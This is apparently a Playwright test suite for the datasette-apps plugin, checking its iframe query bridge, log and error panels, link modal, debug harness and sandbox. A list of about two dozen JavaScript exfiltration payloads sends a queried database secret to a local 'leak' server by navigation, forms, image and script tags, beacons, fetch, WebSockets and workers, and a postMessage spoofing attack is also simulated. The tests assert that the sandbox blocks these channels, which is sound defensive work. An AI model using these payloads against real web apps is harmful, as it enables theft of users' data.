from __future__ import annotations

import asyncio
import json
import os
import socket
import sqlite3
import subprocess
import sys
import threading
import time
from contextlib import contextmanager
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.request import urlopen

from datasette.app import Datasette
from playwright.sync_api import sync_playwright

from datasette_apps import Registry


def _free_port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


class DatasetteServer:
    def __init__(self, tmp_path: Path, files=None):
        self.files = files or []
        self.internal_db_path = tmp_path / "internal.db"
        self.config_path = tmp_path / "datasette.json"
        self.config_path.write_text(
            json.dumps({"permissions": {"view-app": True}}),
            encoding="utf-8",
        )
        self.port = _free_port()
        self.url = f"http://127.0.0.1:{self.port}"
        self.process = None

    async def create_app(
        self,
        html,
        *,
        name="Playwright app",
        sql_databases=None,
        csp_origins=None,
    ):
        datasette = Datasette(
            [str(path) for path in self.files],
            memory=True,
            internal=str(self.internal_db_path),
            config={"permissions": {"view-app": True}},
        )
        app = await Registry(datasette).create_stored_app(
            actor_id="alice",
            name=name,
            description="",
            html=html,
            is_private=False,
            sql_databases=sql_databases,
            csp_origins=csp_origins,
        )
        datasette.close()
        return app

    def app_url(self, app):
        return f"{self.url}/-/apps/{app['id']}"

    def __enter__(self):
        command = [
            sys.executable,
            "-m",
            "datasette",
            "serve",
            *[str(path) for path in self.files],
            "--memory",
            "--internal",
            str(self.internal_db_path),
            "--config",
            str(self.config_path),
            "--host",
            "127.0.0.1",
            "--port",
            str(self.port),
        ]
        self.process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        self._wait_for_server()
        return self

    def __exit__(self, exc_type, exc, traceback):
        self.process.terminate()
        try:
            self.process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            self.process.kill()
            self.process.communicate()

    def _wait_for_server(self):
        deadline = time.monotonic() + 10
        last_error = None
        while time.monotonic() < deadline:
            if self.process.poll() is not None:
                stdout, stderr = self.process.communicate()
                raise AssertionError(
                    "Datasette server exited before accepting requests\n"
                    f"stdout:\n{stdout}\n\nstderr:\n{stderr}"
                )
            try:
                with urlopen(self.url + "/-/versions", timeout=0.5) as response:
                    if response.status < 500:
                        return
            except OSError as ex:
                last_error = ex
            time.sleep(0.1)
        raise AssertionError(f"Datasette server did not start: {last_error}")


class LeakServer:
    def __init__(self):
        self.requests = []
        self._lock = threading.Lock()
        self._server = ThreadingHTTPServer(("127.0.0.1", 0), self._handler())
        self.url = f"http://127.0.0.1:{self._server.server_port}"
        self._thread = threading.Thread(target=self._server.serve_forever)
        self._thread.daemon = True

    def _handler(self):
        leak_server = self

        class Handler(BaseHTTPRequestHandler):
            def _record_and_respond(self):
                if self.path.startswith("/leak"):
                    with leak_server._lock:
                        leak_server.requests.append(
                            {"method": self.command, "path": self.path}
                        )
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"ok")

            def do_GET(self):
                self._record_and_respond()

            def do_POST(self):
                self._record_and_respond()

            def log_message(self, format, *args):
                pass

        return Handler

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, exc_type, exc, traceback):
        self._server.shutdown()
        self._server.server_close()
        self._thread.join(timeout=5)

    def wait_for_request_count(self, count, timeout=5):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._lock:
                if len(self.requests) >= count:
                    return
            time.sleep(0.05)
        raise AssertionError(f"Expected {count} leak requests, got {self.requests}")


@contextmanager
def _browser_page(*, args=None, ignore_https_errors=False):
    with sync_playwright() as playwright:
        browser_name = os.environ.get("DATASETTE_APPS_PLAYWRIGHT_BROWSER", "chromium")
        launch_kwargs = {"args": args or []}
        if browser_name == "chrome":
            browser_type = playwright.chromium
            launch_kwargs["channel"] = "chrome"
        else:
            try:
                browser_type = getattr(playwright, browser_name)
            except AttributeError as ex:
                raise AssertionError(
                    "DATASETTE_APPS_PLAYWRIGHT_BROWSER must be one of "
                    "chromium, chrome, firefox, or webkit"
                ) from ex
        browser = browser_type.launch(**launch_kwargs)
        try:
            page = browser.new_page(ignore_https_errors=ignore_https_errors)
            yield page
        finally:
            browser.close()


def _iframe(page):
    frame = page.locator("#datasette-app-frame").element_handle()
    assert frame is not None
    iframe = frame.content_frame()
    assert iframe is not None
    return iframe


def _create_content_database(path):
    conn = sqlite3.connect(path)
    try:
        conn.execute("create table items (name text, score integer)")
        conn.executemany(
            "insert into items values (?, ?)",
            [
                ("alpha", 2),
                ("beta", 5),
            ],
        )
        conn.commit()
    finally:
        conn.close()


MALICIOUS_EXFILTRATION_ATTEMPTS = [
    (
        "self-navigation",
        "window.location.href = LEAK_URL;",
    ),
    (
        "top-navigation",
        "window.top.location.href = LEAK_URL;",
    ),
    (
        "popup-navigation",
        'window.open(LEAK_URL, "_blank");',
    ),
    (
        "anchor-top-click",
        """
const anchor = document.createElement("a");
anchor.href = LEAK_URL;
anchor.target = "_top";
document.body.appendChild(anchor);
anchor.click();
""",
    ),
    (
        "anchor-ping",
        """
const anchor = document.createElement("a");
anchor.href = "#";
anchor.ping = LEAK_URL;
document.body.appendChild(anchor);
anchor.click();
""",
    ),
    (
        "meta-refresh",
        """
const meta = document.createElement("meta");
meta.httpEquiv = "refresh";
meta.content = "0; url=" + LEAK_URL;
document.head.appendChild(meta);
""",
    ),
    (
        "form-get",
        """
const form = document.createElement("form");
form.method = "GET";
form.action = LEAK_BASE + "/leak";
const input = document.createElement("input");
input.name = "secret";
input.value = SECRET;
form.appendChild(input);
document.body.appendChild(form);
form.submit();
""",
    ),
    (
        "form-get-top",
        """
const form = document.createElement("form");
form.method = "GET";
form.action = LEAK_BASE + "/leak";
form.target = "_top";
const input = document.createElement("input");
input.name = "secret";
input.value = SECRET;
form.appendChild(input);
document.body.appendChild(form);
form.submit();
""",
    ),
    (
        "image-src",
        """
const img = document.createElement("img");
img.src = LEAK_URL;
document.body.appendChild(img);
""",
    ),
    (
        "script-src",
        """
const script = document.createElement("script");
script.src = LEAK_URL;
document.body.appendChild(script);
""",
    ),
    (
        "stylesheet-href",
        """
const link = document.createElement("link");
link.rel = "stylesheet";
link.href = LEAK_URL;
document.head.appendChild(link);
""",
    ),
    (
        "nested-iframe-src",
        """
const iframe = document.createElement("iframe");
iframe.src = LEAK_URL;
document.body.appendChild(iframe);
""",
    ),
    (
        "object-data",
        """
const object = document.createElement("object");
object.data = LEAK_URL;
document.body.appendChild(object);
""",
    ),
    (
        "audio-src",
        """
const audio = document.createElement("audio");
audio.src = LEAK_URL;
document.body.appendChild(audio);
audio.load();
""",
    ),
    (
        "prefetch-link",
        """
const link = document.createElement("link");
link.rel = "prefetch";
link.href = LEAK_URL;
document.head.appendChild(link);
""",
    ),
    (
        "css-import",
        """
const style = document.createElement("style");
style.textContent = "@import url(" + JSON.stringify(LEAK_URL) + ");";
document.head.appendChild(style);
""",
    ),
    (
        "svg-image-href",
        """
const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
const image = document.createElementNS("http://www.w3.org/2000/svg", "image");
image.setAttribute("href", LEAK_URL);
svg.appendChild(image);
document.body.appendChild(svg);
""",
    ),
    (
        "fetch-no-cors",
        'fetch(LEAK_URL, {mode: "no-cors"}).catch(function() {});',
    ),
    (
        "send-beacon",
        "navigator.sendBeacon(LEAK_URL, SECRET);",
    ),
    (
        "xml-http-request-post",
        """
const xhr = new XMLHttpRequest();
xhr.open("POST", LEAK_URL);
xhr.send(SECRET);
""",
    ),
    (
        "websocket",
        """
const socket = new WebSocket(WS_LEAK_URL);
socket.onerror = function() { socket.close(); };
""",
    ),
    (
        "worker-script",
        """
try {
  const worker = new Worker(LEAK_URL);
  worker.terminate();
} catch (error) {}
""",
    ),
    (
        "dynamic-import",
        """
import(LEAK_URL).catch(function() {});
""",
    ),
]


def _create_secret_database(path):
    conn = sqlite3.connect(path)
    try:
        conn.execute("create table secrets (secret text)")
        conn.execute("insert into secrets values ('database-secret')")
        conn.commit()
    finally:
        conn.close()


def _malicious_app_html(attempt_script, leak_base):
    return f"""<!doctype html>
<html>
<head><title>Exfiltration attempt</title></head>
<body>
<p id="status">loaded</p>
<script>
const LEAK_BASE = {json.dumps(leak_base)};
const status = document.getElementById("status");
(async function() {{
  const result = await datasette.query("content", "select secret from secrets");
  const SECRET = result.rows[0].secret;
  const LEAK_URL = LEAK_BASE + "/leak?secret=" + encodeURIComponent(SECRET);
  const WS_LEAK_URL = LEAK_URL.replace(/^http/, "ws");
  window.runAttempt = function() {{
    status.textContent = "attempted";
    try {{
{attempt_script}
    }} catch (error) {{
      status.textContent = "attempted with error";
    }}
  }};
  status.textContent = "ready";
}})();
</script>
</body>
</html>"""


async def _create_malicious_apps(server, leak_base):
    apps = []
    for name, attempt_script in MALICIOUS_EXFILTRATION_ATTEMPTS:
        app = await server.create_app(
            _malicious_app_html(attempt_script, leak_base),
            name=f"Exfiltration attempt: {name}",
            sql_databases=["content"],
        )
        apps.append((name, app))
    return apps


def test_datasette_query_bridge_returns_data_to_iframe(tmp_path):
    content_db_path = tmp_path / "content.db"
    _create_content_database(content_db_path)
    server = DatasetteServer(tmp_path, files=[content_db_path])
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<p id="result">waiting</p>
<script>
(async function() {
  const result = await datasette.query(
    "content",
    "select name, score from items order by score desc"
  );
  document.getElementById("result").textContent = JSON.stringify(result.rows);
})();
</script>""",
            name="Query bridge",
            sql_databases=["content"],
        )
    )

    with server, _browser_page() as page:
        response = page.goto(server.app_url(app))
        assert response is not None
        assert response.headers["content-security-policy"] == "frame-src 'none';"
        iframe = _iframe(page)
        iframe.locator("#result").wait_for()
        assert iframe.locator("#result").inner_text() == (
            '[{"name":"beta","score":5},{"name":"alpha","score":2}]'
        )


def test_replaced_iframe_document_cannot_use_global_query_messages(tmp_path):
    # This is a defense-in-depth regression for the old global postMessage()
    # bridge. If the iframe document is replaced after the real app loads, the
    # replacement document still has the same iframe contentWindow. The old
    # parent bridge trusted that window identity alone, so this fake document
    # could ask the parent to run app-scoped SQL.
    content_db_path = tmp_path / "content.db"
    _create_content_database(content_db_path)
    server = DatasetteServer(tmp_path, files=[content_db_path])
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<p id="ready">original app</p>
<script>
datasette.query("content", "select 1 as ok");
</script>""",
            name="Replaced iframe bridge",
            sql_databases=["content"],
        )
    )

    with server, _browser_page() as page:
        page.goto(server.app_url(app))
        _iframe(page).locator("#ready").wait_for()

        # Replace the iframe with a document that did not receive the private
        # MessagePort from the injected Datasette bridge. It then tries to use
        # the old global postMessage() query protocol directly.
        attack_result = page.evaluate("""
        () => new Promise((resolve) => {
          const iframe = document.getElementById("datasette-app-frame");
          let done = false;
          function finish(value) {
            if (done) {
              return;
            }
            done = true;
            window.removeEventListener("message", onMessage);
            resolve(value);
          }
          function onMessage(event) {
            if (event.data && event.data.type === "attack-result") {
              finish(event.data);
            }
          }
          window.addEventListener("message", onMessage);
          iframe.srcdoc = `
            <!doctype html>
            <p>replacement document</p>
            <script>
            // If the parent still accepts privileged global postMessage()
            // requests from iframe.contentWindow, this listener will see a
            // query response and forward it to the test harness.
            window.addEventListener("message", function(event) {
              if (event.data && event.data.type === "datasette-app-response") {
                parent.postMessage({
                  type: "attack-result",
                  response: event.data
                }, "*");
              }
            });
            // This mimics the pre-MessageChannel bridge protocol without using
            // window.datasette. The secure parent should ignore it completely.
            parent.postMessage({
              type: "datasette-app-query",
              id: 4242,
              input: {
                database: "content",
                sql: "select name, score from items order by score desc"
              }
            }, "*");
            <\\/script>
          `;
          setTimeout(() => finish({status: "no-response-from-parent"}), 500);
        })
        """)

        # Secure behavior: the replacement document cannot get a response,
        # because it never received the MessagePort capability.
        assert attack_result == {"status": "no-response-from-parent"}


def test_iframe_errors_render_in_parent_error_panel(tmp_path):
    server = DatasetteServer(tmp_path)
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<p>App with an error</p>
<script>
console.error("Playwright saw this app error");
</script>""",
            name="Error bridge",
        )
    )

    with server, _browser_page() as page:
        page.goto(server.app_url(app))
        page.locator(".datasette-app-error-panel:not([hidden])").wait_for()
        page.locator(".datasette-app-error-kind", has_text="console-error").wait_for(
            state="attached"
        )
        page.locator(
            ".datasette-app-error-message", has_text="Playwright saw this app error"
        ).wait_for(state="attached")
        assert page.locator(".datasette-app-error-count").inner_text() == "1 error"
        assert (
            page.locator(".datasette-app-error-kind").text_content() == "console-error"
        )
        assert (
            page.locator(".datasette-app-error-message").text_content()
            == "Playwright saw this app error"
        )


def test_iframe_logs_render_below_iframe_in_collapsed_parent_log_panel(tmp_path):
    content_db_path = tmp_path / "content.db"
    _create_content_database(content_db_path)
    server = DatasetteServer(tmp_path, files=[content_db_path])
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<p id="result">waiting</p>
<script>
(async function() {
  console.log("Playwright saw this app log", {answer: 42});
  const result = await datasette.query(
    "content",
    "select name from items where score > :score",
    {score: 2}
  );
  document.getElementById("result").textContent = result.rows[0].name;
})();
</script>""",
            name="Log bridge",
            sql_databases=["content"],
        )
    )

    with server, _browser_page() as page:
        page.goto(server.app_url(app))
        iframe = _iframe(page)
        iframe.locator("#result", has_text="beta").wait_for()

        panel = page.locator(".datasette-app-log-panel:not([hidden])")
        panel.wait_for()
        assert panel.evaluate("element => element.open") is False
        assert page.locator(".datasette-app-log-count").inner_text() == "2 log entries"
        assert (
            page.locator(".datasette-app-log-kind", has_text="console-log").count() == 1
        )
        assert (
            page.locator(
                ".datasette-app-log-message",
                has_text='Playwright saw this app log {"answer":42}',
            ).count()
            == 1
        )
        assert (
            page.locator(
                ".datasette-app-log-message",
                has_text="datasette.query(content, select name from items",
            ).count()
            == 1
        )
        assert (
            page.locator(".datasette-app-log-details", has_text="Method: query").count()
            == 1
        )
        assert (
            page.locator(
                ".datasette-app-log-details", has_text='Params: {"score":2}'
            ).count()
            == 1
        )
        assert page.evaluate("""() => {
              const iframe = document.getElementById("datasette-app-frame");
              const panel = document.querySelector(".datasette-app-log-panel");
              return !!(iframe.compareDocumentPosition(panel) &
                Node.DOCUMENT_POSITION_FOLLOWING);
            }""")


def test_iframe_link_click_shows_parent_confirmation_modal(tmp_path):
    server = DatasetteServer(tmp_path)
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<a id="external-link" href="https://example.com/docs?from=app#section">
  Open docs
</a>
<p id="location">still here</p>""",
            name="External link app",
        )
    )

    with server, _browser_page() as page:
        page.context.route(
            "https://example.com/docs?from=app",
            lambda route: route.fulfill(
                status=200,
                content_type="text/html",
                body="<title>External docs</title><h1>External docs</h1>",
            ),
        )
        page.goto(server.app_url(app))
        iframe = _iframe(page)
        iframe.locator("#external-link").click()

        modal = page.locator(".datasette-app-link-modal")
        modal.wait_for(state="visible")
        assert modal.locator("h2").inner_text() == "Open external link"
        assert (
            modal.locator(".datasette-app-link-url").inner_text()
            == "https://example.com/docs?from=app#section"
        )
        assert iframe.locator("#location").inner_text() == "still here"

        modal.locator("button", has_text="Cancel").click()
        modal.wait_for(state="hidden")

        iframe.locator("#external-link").click()
        modal.wait_for(state="visible")
        with page.expect_popup() as popup_info:
            modal.locator("button", has_text="Open link").click()
        popup = popup_info.value
        popup.wait_for_load_state()
        assert popup.url == "https://example.com/docs?from=app#section"


def test_long_iframe_link_url_does_not_overflow_confirmation_modal(tmp_path):
    long_url = "https://example.com/?query=" + ("encoded%20value%20" * 500)
    server = DatasetteServer(tmp_path)
    app = asyncio.run(
        server.create_app(
            f"""<!doctype html>
<a id="external-link" href="{long_url}">Open long URL</a>""",
            name="Long external link app",
        )
    )

    with server, _browser_page() as page:
        page.set_viewport_size({"width": 800, "height": 500})
        page.goto(server.app_url(app))
        _iframe(page).locator("#external-link").click()

        modal = page.locator(".datasette-app-link-modal")
        modal.wait_for(state="visible")
        dialog_box = modal.locator(".datasette-app-link-dialog").bounding_box()
        assert dialog_box is not None
        assert dialog_box["y"] >= 0
        assert dialog_box["y"] + dialog_box["height"] <= 500

        url_preview = modal.locator(".datasette-app-link-url")
        assert url_preview.evaluate(
            "element => element.scrollHeight > element.clientHeight"
        )
        open_button_box = modal.locator("button", has_text="Open link").bounding_box()
        assert open_button_box is not None
        assert open_button_box["y"] >= 0
        assert open_button_box["y"] + open_button_box["height"] <= 500


def test_fullscreen_parent_bridge_ui_uses_plugin_stylesheet(tmp_path):
    server = DatasetteServer(tmp_path)
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<a id="external-link" href="https://example.com/docs">Open docs</a>
<script>
console.error("Fullscreen error");
console.log("Fullscreen log");
</script>""",
            name="Fullscreen bridge styles",
        )
    )

    with server, _browser_page() as page:
        page.goto(server.app_url(app) + "?full=1")
        page.locator(".datasette-app-error-panel:not([hidden])").wait_for()
        page.locator(".datasette-app-log-panel:not([hidden])").wait_for()

        assert (
            page.locator(
                'link[href="/-/static-plugins/datasette-apps/datasette-apps.css"]'
            ).count()
            == 1
        )
        assert (
            page.locator(".datasette-app-error-panel").evaluate(
                "element => getComputedStyle(element).backgroundColor"
            )
            == "rgb(255, 250, 240)"
        )
        assert (
            page.locator(".datasette-app-log-panel").evaluate(
                "element => getComputedStyle(element).backgroundColor"
            )
            == "rgb(247, 249, 251)"
        )

        iframe = _iframe(page)
        iframe.locator("#external-link").click()

        modal = page.locator(".datasette-app-link-modal")
        modal.wait_for(state="visible")
        assert "Arial" in modal.locator(".datasette-app-link-dialog").evaluate(
            "element => getComputedStyle(element).fontFamily"
        )
        assert (
            modal.evaluate("element => getComputedStyle(element).position") == "fixed"
        )
        assert modal.evaluate("element => getComputedStyle(element).display") == "flex"


def test_iframe_hash_link_click_runs_app_handler_without_parent_modal(tmp_path):
    server = DatasetteServer(tmp_path)
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<a id="internal-action" href="#" onclick="selectItem(); return false;">
  Select item
</a>
<p id="status">waiting</p>
<script>
function selectItem() {
  document.getElementById("status").textContent = "selected";
}
</script>""",
            name="Hash link action app",
        )
    )

    with server, _browser_page() as page:
        page.goto(server.app_url(app))
        iframe = _iframe(page)
        iframe.locator("#internal-action").click()

        iframe.locator("#status", has_text="selected").wait_for()
        page.wait_for_timeout(200)
        assert page.locator(".datasette-app-link-modal").count() == 0


def test_malicious_apps_cannot_exfiltrate_to_external_origin(tmp_path):
    content_db_path = tmp_path / "content.db"
    _create_secret_database(content_db_path)
    with LeakServer() as leak_server:
        server = DatasetteServer(tmp_path, files=[content_db_path])
        apps = asyncio.run(_create_malicious_apps(server, leak_server.url))

        with server, _browser_page() as page:
            for name, app in apps:
                response = page.goto(server.app_url(app))
                assert response is not None, name
                assert (
                    response.headers["content-security-policy"] == "frame-src 'none';"
                ), name
                iframe = _iframe(page)
                iframe.locator("#status").wait_for()
                assert iframe.locator("#status").inner_text() == "ready", name
                iframe.evaluate("window.runAttempt()")
                page.wait_for_timeout(300)
                assert leak_server.requests == [], name
                for open_page in page.context.pages:
                    if open_page != page:
                        open_page.close()


def test_csp_allowlisted_origin_can_receive_exfiltrated_data(tmp_path, monkeypatch):
    content_db_path = tmp_path / "content.db"
    _create_secret_database(content_db_path)
    monkeypatch.setenv("DATASETTE_APPS_ALLOW_INSECURE_TEST_CSP_ORIGINS", "1")
    with LeakServer() as leak_server:
        server = DatasetteServer(tmp_path, files=[content_db_path])
        app = asyncio.run(
            server.create_app(
                _malicious_app_html(
                    'fetch(LEAK_URL, {mode: "no-cors"}).catch(function() {});',
                    leak_server.url,
                ),
                name="Allowed exfiltration attempt",
                sql_databases=["content"],
                csp_origins=[leak_server.url],
            )
        )

        with server, _browser_page() as page:
            response = page.goto(server.app_url(app))
            assert response is not None
            iframe = _iframe(page)
            iframe.locator("#status").wait_for()
            assert iframe.locator("#status").inner_text() == "ready"
            iframe.evaluate("window.runAttempt()")
            leak_server.wait_for_request_count(1)

        assert leak_server.requests == [
            {"method": "GET", "path": "/leak?secret=database-secret"}
        ]


DEBUG_ACTOR_SECRET = "datasette-apps-debug-test-secret"

# Simulates datasette-agent's browser-task runtime: the status element
# carrying data-task-id, the .agent-browser-task-html container whose
# scripts are re-created so they execute, and a window.datasetteAgent
# stub whose claimTask hands out the payload exactly once and whose
# completeTask records the posted envelope on window for the test to
# read. Only the runtime boundary is faked - the harness, bridge, frame
# and query endpoints are all real.
DEBUG_TASK_BOOTSTRAP = """
({taskId, payload, harnessHtml}) => {
  window.__debugTaskResults = window.__debugTaskResults || [];
  window.__claimedTasks = window.__claimedTasks || {};
  window.datasetteAgent = {
    claimTask: async (id) => {
      if (id !== taskId || window.__claimedTasks[id]) {
        return {ok: false, state: "running"};
      }
      window.__claimedTasks[id] = true;
      return {ok: true, payload, timeoutMs: payload.timeout_ms + 2000};
    },
    completeTask: async (id, envelope) => {
      window.__debugTaskResults.push({id, envelope});
    },
    cancelTask: async () => {},
  };
  const statusEl = document.createElement("div");
  statusEl.className = "agent-browser-task running";
  statusEl.dataset.taskId = taskId;
  document.body.appendChild(statusEl);
  const htmlEl = document.createElement("div");
  htmlEl.className = "agent-browser-task-html";
  // Matches renderBrowserTask: the container carries the task id, the
  // sanctioned discovery contract for task HTML
  htmlEl.dataset.taskId = taskId;
  htmlEl.insertAdjacentHTML(
    "beforeend", harnessHtml.replaceAll("__DATASETTE_TASK_ID__", taskId)
  );
  document.body.appendChild(htmlEl);
  htmlEl.querySelectorAll("script").forEach(oldScript => {
    const newScript = document.createElement("script");
    for (const attr of oldScript.attributes) {
      newScript.setAttribute(attr.name, attr.value);
    }
    newScript.textContent = oldScript.textContent;
    oldScript.replaceWith(newScript);
  });
}
"""


def _signed_actor_cookie(actor_id="alice"):
    datasette = Datasette(memory=True, secret=DEBUG_ACTOR_SECRET)
    return datasette.sign({"a": {"id": actor_id}}, "actor")


async def _create_debug_job_with_task(server, app_id, javascript, **kwargs):
    from datasette_apps.debug import (
        build_debug_harness_html,
        create_debug_job,
        debug_task_payload,
    )

    datasette = Datasette(
        [str(path) for path in server.files],
        memory=True,
        internal=str(server.internal_db_path),
        config={"permissions": {"view-app": True}},
    )
    job = await create_debug_job(
        datasette, actor_id="alice", app_id=app_id, javascript=javascript, **kwargs
    )
    payload = debug_task_payload(datasette, job)
    datasette.close()
    return job, payload, build_debug_harness_html()


def _run_debug_task(server, page, task_id, payload, harness):
    page.context.add_cookies(
        [{"name": "ds_actor", "value": _signed_actor_cookie(), "url": server.url}]
    )
    response = page.goto(server.url + "/")
    assert response is not None
    page.evaluate(
        DEBUG_TASK_BOOTSTRAP,
        {"taskId": task_id, "payload": payload, "harnessHtml": harness},
    )


def _wait_for_task_result(page, count=1):
    page.wait_for_function(
        f"window.__debugTaskResults && window.__debugTaskResults.length >= {count}"
    )
    return page.evaluate("window.__debugTaskResults")


def test_debug_harness_runs_script_in_hidden_app_frame(tmp_path, monkeypatch):
    monkeypatch.setenv("DATASETTE_SECRET", DEBUG_ACTOR_SECRET)
    content_db_path = tmp_path / "content.db"
    _create_content_database(content_db_path)
    server = DatasetteServer(tmp_path, files=[content_db_path])
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<div id="status">loading</div>
<script>
(async function() {
  const result = await datasette.query(
    "content", "select name from items order by score desc"
  );
  const list = document.createElement("ul");
  list.id = "items";
  result.rows.forEach((row) => {
    const item = document.createElement("li");
    item.textContent = row.name;
    list.appendChild(item);
  });
  document.body.appendChild(list);
  document.getElementById("status").textContent = "ready";
})();
</script>""",
            name="Debuggable app",
            sql_databases=["content"],
        )
    )
    job, payload, harness = asyncio.run(
        _create_debug_job_with_task(
            server,
            app["id"],
            """
const list = await debug.waitFor(() => document.querySelector("#items"));
// The hidden frame's first layout commit can lag DOM readiness on slow
// machines - window.innerWidth reads 0 until it happens, so wait for it
// like any other readiness condition.
await debug.waitFor(() => window.innerWidth);
return {
  itemCount: list.querySelectorAll("li").length,
  status: document.querySelector("#status").textContent,
  width: window.innerWidth,
  height: window.innerHeight,
};
""",
            viewport={"width": 375, "height": 812},
        )
    )

    with server, _browser_page() as page:
        _run_debug_task(server, page, "01TASK0000000000000000TEST", payload, harness)
        results = _wait_for_task_result(page)
        assert results[0]["id"] == "01TASK0000000000000000TEST"
        envelope = results[0]["envelope"]

        assert envelope["ok"] is True
        assert envelope["timed_out"] is False
        assert isinstance(envelope["duration_ms"], int)
        assert envelope["result"] == {
            "itemCount": 2,
            "status": "ready",
            "width": 375,
            "height": 812,
        }
        assert envelope["events"]["errors"] == []
        assert any(
            log.get("kind") == "datasette-call" for log in envelope["events"]["logs"]
        )

        # The hidden iframe is torn down after the run
        page.wait_for_function("document.querySelectorAll('iframe').length === 0")

        # Re-rendering the harness (history replay, duplicate tab) hits
        # the one-shot claim and stands down: no iframe, no new result
        page.evaluate(
            DEBUG_TASK_BOOTSTRAP,
            {
                "taskId": "01TASK0000000000000000TEST",
                "payload": payload,
                "harnessHtml": harness,
            },
        )
        page.wait_for_timeout(500)
        assert page.evaluate("document.querySelectorAll('iframe').length") == 0
        assert page.evaluate("window.__debugTaskResults.length") == 1


def test_debug_harness_reports_app_errors_and_unserializable_result(
    tmp_path, monkeypatch
):
    monkeypatch.setenv("DATASETTE_SECRET", DEBUG_ACTOR_SECRET)
    server = DatasetteServer(tmp_path)
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<h1 id="title">Broken app</h1>
<script>
console.error("app warned");
throw new Error("render exploded");
</script>""",
            name="Broken app",
        )
    )
    job, payload, harness = asyncio.run(
        _create_debug_job_with_task(
            server, app["id"], "return document.querySelector('#title');"
        )
    )

    with server, _browser_page() as page:
        _run_debug_task(server, page, "01TASK0000000000000000FAIL", payload, harness)
        envelope = _wait_for_task_result(page)[0]["envelope"]

        # The debug script returned a DOM node: rejected with a corrective
        # message, while the app's own errors are still captured.
        assert envelope["ok"] is False
        assert "not JSON-serializable" in envelope["error"]["message"]
        kinds = {error["kind"] for error in envelope["events"]["errors"]}
        assert "console-error" in kinds
        assert "javascript-error" in kinds
        messages = " ".join(
            error.get("message", "") for error in envelope["events"]["errors"]
        )
        assert "app warned" in messages
        # WebKit withholds uncaught-error details in sandboxed (opaque
        # origin) frames - srcdoc and URL frames alike - reporting only
        # "Script error."; the bridge annotates those so readers know why
        # details are missing. Chromium and Firefox report in full.
        js_errors = [
            error
            for error in envelope["events"]["errors"]
            if error["kind"] == "javascript-error"
        ]
        assert any(
            "render exploded" in error.get("message", "")
            or (error.get("sanitized") and "details withheld" in error["message"])
            for error in js_errors
        )
